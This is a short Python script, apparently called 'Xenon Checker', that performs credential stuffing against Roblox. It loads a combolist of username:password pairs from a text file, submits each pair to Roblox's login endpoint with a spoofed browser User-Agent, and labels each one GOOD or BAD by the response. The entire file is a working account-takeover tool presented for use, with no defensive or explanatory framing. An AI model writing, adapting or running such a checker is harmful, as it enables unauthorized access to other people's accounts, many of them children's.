import requests
from colorama import Fore
from time import sleep
import os

magenta = Fore.MAGENTA
red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET

print(f"[*] {magenta}Connecting...{reset}")
sleep(2)
print(f"[*] {magenta}Connected!{reset}\n\n")

os.system("clear")
print(f"""{magenta}
▒██   ██▒▓█████  ███▄    █  ▒█████   ███▄    █     ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
▒▒ █ █ ▒░▓█   ▀  ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░░  █   ░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒   ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
 ░ █ █ ▒ ▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒   ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██▒ ▒██▒░▒████▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░   ▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒    ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░░   ░▒ ░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░     ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░    ░     ░      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░    ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
 ░    ░     ░  ░         ░     ░ ░           ░    ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
                                                  ░                       ░                               
{reset}""")

comboName = str(input(f"{magenta}Combolist name: {reset}"))
combolist = open(comboName + ".txt", "r").readlines()

session = requests.Session()
login_url = "https://auth.roblox.com/v2/login"

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}

for combo in combolist:
    seq = combo.strip()
    acc = seq.split(":")
    username = acc[0]
    password = acc[1]

    payload = {
        "ctype": "Username",
        "cvalue": username,
        "password": password
    }

    r = session.post(login_url, json=payload, headers=headers)

    if r.status_code == 200 and "user" in r.text:
        print(f"[✔] {green}GOOD: {username}:{password}{reset}")
    else:
        print(f"[✘] {red}BAD: {username}:{password}{reset}")